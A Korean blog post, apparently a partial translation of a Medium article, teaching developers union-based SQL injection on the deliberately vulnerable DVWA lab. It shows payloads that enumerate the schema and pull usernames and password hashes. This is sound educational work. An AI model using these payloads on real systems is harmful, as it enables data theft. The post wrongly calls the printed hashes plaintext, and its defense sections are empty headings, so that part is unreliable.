---
layout: post
title: Medium - SQL injection for developers
description: >
  <a href="https://medium.com/swlh/sql-injection-for-developers-9e0d91ad8cbf"> 원문 - Omer Hamerman </a>
author: author
comments: true
---

Trend 파악을 위한 Medium 기고문 포스팅 - 개발자를 위한 SQL 인젝션; 여러분의 프로그램에서 어떻게 테스트하고 보호할 수 있는지 기본을 알아봅시다.

<center>
<img src="https://miro.medium.com/max/2000/1*GU5VIo93vmfZSMgAtR4ijg.jpeg"/>
</center>

Originally published at <a href="https://omerxx.com/sql-injection-intro">https://omerxx.com/sql-injection-intro</a>

SQL Injection (SQLi)는 2018-2019년 동안 온라인 공격 중 72%가 넘는 비중을 차지 했습니다. 웹 개발자들이 가장 많이 받는 공격이 바로 SQLi 입니다. OWASP Top 10에도 SQL 인젝션 공격이 상위권에 등록되었죠, SQLi는 아주 흔하고 자동화하기도 쉬워서 치명적인 피해를 입힐 수 있습니다.

이 포스트는 제가 개인적으로 알고 싶었던 것들에 대해서 자료를 수집하며 노력을 했던 기록입니다. 반복적으로 자료를 찾고 짧은 비디오를 보기도 했지만 쉽지는 않았죠. SQL 인젝션을 이해하려면 그냥 문서를 읽는 것으론 부족하고 직접 실행을 해보는 수고를 들여야 합니다. 여기에 문맥들은 작고 방대하기 때문에 꽤나 고생을 했죠.

SQL 인젝션은 간단한 개념이지만 엄청나게 변형이 많습니다. 얼마나 많을까요? SQL 디비의 종류, 다양한 웹폼 형식, 개발자 실수를 모두 행렬곱셈 한거 만큼 많을 겁니다.

## What is it
SQLi는 웹 응용프로그램의 데이터에 몰래 접근하는 방법입니다. SQLi를 통해 디비의 데이터를 가져올 수도 있고 소스코드나 다른 민감정보를 가져올 수도 있습니다. 공격을 수행하는 데는 아주 간단한 해킹 도구인 웹 브라우저만 있으면 됩니다. 아주 배우기 쉽고 실행 및 접근이 용이하죠.

여러 종류의 SQLi 공격 방식이 있지만 가장 일반적인 것인 클라이언트 브라우저에서 HTTP 리퀘스트를 날릴 때 입니다. 개발자가 유저에게 `User Id`같은 것을 입력하도록 놔둔 곳 말이죠. 여기에 공격자는 SQL 구문으로 인젝션 공격을 시도할 수 잇습니다. `1`을 입력하는 대신에 다음처럼 입력을 하는 경우를 고려해봅시다.
```
1' UNION SELECT password FROM users UNION SELECT '1
```

만약 백엔드 코드에서 입력값의 컨텍스트를 제대로 고려하지 않으면 해당 입력값을 쿼리처럼 이용할 수 있습니다. 위의 코드의 결과로 간단한 웹 폼에서 데이터베이스의 정보를 뽑아내게 되는 것이죠. 만약 이게 성공한다면 공격자는 실제 서버의 접속을 할 필요도 없습니다. 아주 '합법적'으로 데이터를 뽑아내고 사용할 수 있는 것이죠.

## How to attack
실제 예제를 만들어 보기 위해서 저는 <a href="http://dvwa.co.uk/">Damn Vulnerable Web Application</a> 을 사용할 것입니다. 이것은 빠르게 다양한 테스트를 해볼 수 있으니 얼른 도커를 사용해서 시작해봅시다.

```
docker run --rm -it -p 8080:80 vulnerables/web-dvwa

# 다음 로컬 주소에서 로그인 화면을 볼 수 있습니다. @ http://localhost:8080
#
# 브루트포스 공격이 통할 수 있겠지만 일단 지금은 간단하게 다음과 같이 설정합시다.:
# 1. Login - User: "admin", Password: "password"
# 2. Click "Create / Reset Database"
# 3. 다 끝났습니다 다시 로그인 하세요.
```

## Poking for holes
메뉴의 모듈 중에 SQL 인젝션을 선택합니다. 아무거나 입력해보면 요청받은 파라미터가 UserId 라는 것을 알 수 있으며 처음 선택지는 1을 입력해 보는 것입니다.

```
1

# ID: 1
# First name: admin
# Surname: admin
```

우리의 입력값에 대해 ID, First name, Surname 3개의 필드가 응답이 온것을 볼 수 있습니다. 그러면 `'`를 입력해서 중단을 해봅시다.


```
'

# Output:
# You have an error in your SQL syntax; check the manual that
# corresponds to your MariaDB server version for the right
# syntax to user near ''''' at line 1
```

여기서 이 리스폰스는 굉장한 가치가 있습니다. 응용프로그램이 이렇게 백엔드와 연관된 에러메시지를 보여주는 것은 공격자에게 생생한 피드백을 주는 것이죠. 방어의 수단 중 하나로 응용프로그램은 어떤 정보도 담지 않은 일반적인 메시지를 에러로 리턴하기도 합니다. 하지만 공격자들은 여전히 'blind SQLi'라고 불리는 공격을 실행할 수 있습니다.

다시 우리의 인젝션 공격으로 돌아가봅시다. `'` 을 사용했더니 앱이 아주 의미있는 메시지를 리턴해줬죠. `'''''` 이 부분을 보시면 인젝션이 통해서 DB 엔진의 리스폰스가 온 것을 알 수 있습니다. 따라서 우리는 여러가지 시도를 하면서 시각적인 피드백을 받을 수 있는 것이죠.

SQL `UNION` 구문은 아주 일반적인 헬퍼입니다. 이걸 사용해서 공격자들은 추가적인 정보를 통합해서 그들에게 결과로 나오도록 할 수 있습니다. 다음 구문을 실행해봅시다

```
1' UNION SELECT '2

# Output: The used SELECT statements have a different number of columns
```

자 그럼 먼저 입력값을 살펴봅시다.
* `1'`의 의미는 1로 구문을 종료하고 따옴표로 닫는다는 것입니다. 이렇게 기존의 SQL 쿼리의 로직 부분을 종료시킬 수 있어서 `'` 따옴표는 정확하게 이스케피으 되지 않으면 매우 위험합니다.
* `UNION SELECT '2` 는 UNION 구문으로 숫자를 선택하고 백엔드 코드에 있는 또다른 구문의 끝을 기다리는 따옴표입니다.

`UNION`을 사용하면 시스템의 동작방식을 살짝 비틀 수 있습니다. `UNION`이 있는 SQL 구문을 호출하면 디비 엔진은 결과를 하나의 집합으로 합치려고 합니다. 그렇게 하기 위해서는 모든 부분들이 같은 컬럼 넘버를 가져야 합니다.

그럼 다음과 같이 추가적인 컬럼을 입력해서 시도해 봅시다.

```
1' UNION SELECT 1,'2

# ID: 1' UNION SELECT 1, '2
# First name: admin
# Surname: admin
# ID: 1' UNION SELECT 1, '2
# First name: 1
# Surname: 2
```

짜잔! 인젝션이 성공했습니다. 물론 실제 데이터를 뽑아낸 것은 아닙니다. 뭔가 의미있는 작업을 하기 위해서는 계속 스키마를 탐구해야 하지만 어찌되었건 결국에는 될 것입니다.

* 처음으로 해야할 것은 쿼리 테이블로부터 디비의 이름을 알아오는 것입니다.

```
1' union select 2, table_schema from information_schema.tables union select 3,'4
```

* 이렇게 하면 "Surname" 아래에 "admin", "dvwa", "information_schema" 세개의 디비 이름을 가져올 수 있습니다.
* 우리는 `dvwa`에 관심이 있으므로 해당 디비의 스키마를 선택하겠습니다.

```
1' union select 2, table_name from information_schema.tables where
table_schema = 'dvwa' union select 3,'4
```

* 해당 쿼리는 "admin", "users", "guestbook" 세개의 테이블 이름을 가져옵니다.
* "Users" 테이블은 보통 유저 이름, 패스워드, 그리고 다른 개인 식별 정보들을 가지고 있는 것으로 추측할 수 있습니다. 여기다가 우리는 쿼리를 날릴겁니다.

```
1' union select 2, column_name from information_schema.columns
where table_name = 'users' union select 3,'4
```

* 이렇게 하면 컬럼 이름의 리스트를 응답으로 받게 됩니다. 그 중에 "user", "password" 컬럼이 아주 흥미로워 보이는 군요
* 그럼 바로 users 테이블에 쿼리를 날려보겠습니다.

```
1' union select user, password from users union select 1,2'

# ID: 1' union select user, password from users union select 1,2'
# First name: admin
# Surname: admin
# ID: 1' union select user, password from users union select 1,2'
# First name: admin # Surname : 5f4dcc3b5aa765d61d8327deb882cf99
# ID: 1' union select user, password from users union select 1,2'
# First name: gordonb # Surname : e99a18c428cb38d5f260853678922e03
# ID: 1' union select user, password from users union select 1,2'
# First name: 1337 # Surname : 8d3533d75ae2c3966d7e0d4fcc69216b
# ID: 1' union select user, password from users union select 1,2'
# First name: pablo # Surname : 0d107d09f5bbe40cade3de5c71e9e9b7
# ID: 1' union select user, password from users union select 1,2'
# First name: smithy # Surname : 5f4dcc3b5aa765d61d8327deb882cf99
# ID: 1' union select user, password from users union select 1,2'
# First name: 1 # Surname : 2

```

* 보셨습니까? 모든 유저의 이름과 패스워드를 리스트로 뽑아냈습니다. 놀랍게도 패스워드들은 그냥 해쉬도 안되어 있고 그냥 평문으로 되어있습니다.

## Security Level: Medium

### Quick setup to intercept with BurpSuite

## Security Level: High

## Blind SQLi

## Fragmented SQLi

## Automating things with sqlmap

## Defense

### WAF

### Self-defense

## Summary
*
